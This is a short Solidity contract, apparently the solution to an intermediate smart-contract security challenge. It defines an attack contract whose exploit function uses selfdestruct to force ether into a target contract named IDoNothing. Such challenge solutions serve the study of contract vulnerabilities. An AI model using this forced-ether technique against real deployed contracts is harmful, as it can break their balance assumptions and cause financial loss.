// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/IDoNothing.sol";

contract AttackIDoNothing {
    address payable originalContract;

    constructor(address payable _originalContract) public {
        originalContract = _originalContract;
    }

    function exploit() public payable {
        require(msg.value > 0 ether);
        selfdestruct(originalContract);
    }
}